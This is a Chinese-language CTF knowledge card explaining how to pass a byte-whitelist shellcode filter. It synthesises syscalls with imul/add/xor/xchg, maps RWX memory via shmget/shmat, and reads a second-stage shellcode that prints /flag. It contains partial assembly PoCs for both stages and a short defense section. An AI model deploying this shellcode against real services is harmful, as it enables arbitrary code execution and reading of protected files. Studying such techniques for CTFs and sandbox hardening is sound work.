---
id: ctf-pwn-shellcode-byte-whitelist-imul-add-xor-shmget-orw
title: 字节白名单 shellcode：只用 imul/add/xor/xchg 构造 syscall，shmget/shmat 取 RWX 后 readv 二阶段 ORW
type: scenario
domain: ctf
path: ctf/pwn
technique: shellcode-byte-whitelist-arithmetic-encoding
tags:
- pwn
- shellcode
- byte-whitelist
- self-modifying
- syscall
- shmget
- shmat
- readv
- orw
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V161
  verified_at: '2026-11-06T13:49:46+08:00'
  notes: 已对照原文核对：字节白名单 (byte*-51)&0xff<=0x33、shmget/shmat 固定 RWX、readv 二阶段 ORW 一致；修正了卡内 shmget 号构造（0x1d 不在白名单，原文用 add 0x1e 后 dec），PoC 未在本机执行。
url: /docs/ctf/pwn/ctf-pwn-shellcode-byte-whitelist-imul-add-xor-shmget-orw/
draft: false
kb_aliases:
- 5 的倍数 shellcode
- 字节白名单绕过
- imul edx edx 0
- shmget shmat RWX
- readv 二阶段 shellcode
- childcode
---

## 一句话结论

当题目对提交的 shellcode 做逐字节白名单（只允许满足 `(byte * -51) & 0xFF <= 0x33` 的字节）时，可以用这些受限字节拼出 `imul edx,edx,0`、`add eax,imm32`、`xor dh,al`、`xchg`、`push/pop` 等指令，动态合成 syscall 号与参数；先 `shmget(0,0xa00,0x3ff)` + `shmat(rax,0x50000,0x8000)` 取得 RWX 内存，再用 `readv` 写入二阶段 shellcode 并跳转执行，最终 openat/readv/writev 读取 flag。

## 原理

- **字节级白名单**：服务端对每个 shellcode 字节做 `(i * -51) & 0xFF <= 0x33` 检查，只允许约 52 个字节值；常规 `mov/pop rdi/syscall` 机器码中很多字节不在集合内，直接提交会被拒绝。
- **用允许字节合成指令**：`0x69`（imul r32,r/m32,imm32）可把 `edx` 清零；`0x05`（add eax,imm32）可把 eax 调成任意 syscall 号；`0x32`（xor r8,r/m8）可改 `dh/ah` 等高位；`0x87`（xchg r32,r32）可交换寄存器；`0x50/0x5f` 等 push/pop 可布置栈上的指针/参数。组合这些指令即可在不出现禁用字节的情况下设置 rax/rdi/rsi/rdx。
- **`imul edx,edx,0` 清零**：机器码 `69 d2 00 00 00 00` 中 `0x69,0xd2,0x00` 均在白名单内；它把 rdx 置 0，避免使用 `xor edx,edx`（字节可能被禁）。
- **取 RWX 内存**：`shmget(0, 0xa00, 0x3ff)` 申请共享内存段，`shmat(rax, 0x50000, 0x8000)` 将其映射到固定地址 0x50000（RWX）；随后 `readv` 从 stdin 读入二阶段 shellcode 到该地址，`jmp rsi` 执行。
- **二阶段 ORW**：二阶段不受字节白名单限制，直接 `openat(AT_FDCWD, "/flag", 0)` → `readv(fd, iov, 1)` → `writev(1, iov, 1)`，或 `open/read/write`。
- **为什么可行**：白名单只检查字节值，不检查指令语义；受限字节仍能表达完整的 x86-64 指令子集，尤其是算术/交换/栈操作，足以构造任意寄存器状态和 syscall。
- **前提**：目标允许 `syscall` 指令字节（0x0f 0x05 均需在白名单）；`shmget/shmat` 未被 seccomp 禁用；有可写可执行映射或二阶段加载路径。

## 触发条件

- Pwn 服务读取用户提交的 shellcode，并逐字节执行白名单/黑名单过滤。
- 过滤器允许 `0x69/0x05/0x32/0x87/0x50/0x5f/0x0f/0x05` 等必要字节。
- 目标 syscall 可用（shmget/shmat/readv/writev 未被 seccomp 拦截）。
- 存在可写可执行内存或可通过 `shmat` 获得固定 RWX 地址。
- 二阶段 shellcode 可通过 stdin/readv 读入。

## 利用步骤

1. 枚举白名单允许的字节值，确认 `0x69/0xd2/0x00/0x05/0x32/0x87/0x50/0x5f/0x0f` 等可用。
2. 用 `imul edx,edx,0` 清零 rdx；先 `add eax, 0x1e` 再 `dec eax` 得到 `shmget` 号（0x1d；直接使用立即数 0x1d 不在白名单），参数用 `mov esi, imm`/`xchg` 布置。
3. 通过 `xor dh, al`、`xchg eax,ecx`、`mov esi, imm`、`push/pop` 等组合设置 rdi/rsi/rdx，执行 `syscall` 调用 shmget。
4. 用同样方式设置 shmat 参数（shmid=rax、shmaddr=0x50000、shmflg=0x8000），执行 syscall 得到 RWX 地址。
5. 构造 `readv`/`read` 调用，把二阶段 shellcode 读到 0x50000；`jmp rsi` 或 `call rax` 跳转。
6. 二阶段执行 openat("/flag")、readv、writev，输出 flag。
7. 本地用相同过滤函数校验最终 payload 的每个字节，避免提交后才被拒绝。

## PoC

受限字节构造片段（摘自原文 payload，完整 payload 见原文）：

```asm
.byte 0x69,0xd2,0x00,0x00,0x00,0x00   # imul edx, edx, 0 -> rdx=0
xchg edi, edx                          # rdi=0
.byte 0x05,0x1e,0x00,0x00,0x00         # add eax, 0x1e（0x1e 在白名单内）
dec eax                                # eax=0x1d -> shmget（0x1d 本身不合法，需用 dec 得到）
mov esi, 0x5000
syscall                                # shmget(0, 0xa00, 0x3ff)
...
push rax
...
mov esi, 0x1e
xchg esi, eax                          # eax=0x1e -> shmat
mov esi, 0x50000
syscall                                # shmat(...)
...
mov esi, 0x50000
jmp rsi                                # 跳到二阶段
```

二阶段（不受限）：

```asm
mov rax, 0x101        ; openat
mov rdi, 0x3
mov rsi, 0x50100      ; "/flag"
xor rdx, rdx
syscall
mov rdi, rax
mov rsi, 0x50108
mov rdx, 1
mov rax, 0x13         ; readv
syscall
mov rdi, 1
mov rsi, 0x50108
mov rdx, 1
mov rax, 0x14         ; writev
syscall
```

## 变体与关联

- 变体：用 `sub`/`xor`/`rol`/`bswap` 等其它允许字节合成常量；用 `push imm32` + `pop reg` 设置参数。
- 变体：若没有 shmget/shmat，可用 `mprotect`/`mmap` 或把二阶段写到已有 RWX 段。
- 变体：把二阶段压缩/加密，第一阶段只做解码+跳转，减少受限字节构造量。
- 关联：[[binary-pwn-sandbox-escape-alpha3-visible-shellcode-seccomp-orw]]（可见字符 shellcode 与 ORW）、[[binary-pwn-stack-ret2shellcode-mprotect-bss-rwx-page]]（mprotect 后执行 shellcode）、[[ctf-pwn-shellcode-static-string-nullbyte-offset-obfuscation]]（shellcode 静态特征消除）。

## 检测与防御

- 防御：字节白名单不是安全边界；服务端应使用 seccomp 限制 syscall、W^X/不可执行内存、独立低权限进程，禁止 shmget/shmat 等不必要调用。
- 检测：监控提交的超长 shellcode、异常 syscall 序列（shmget/shmat/readv）、向固定地址写入后跳转的行为。
- CTF 分析：先本地复现过滤函数，逐字节校验 payload；注意 `syscall` 两字节、`imul` 六字节等指令是否全部在白名单内。
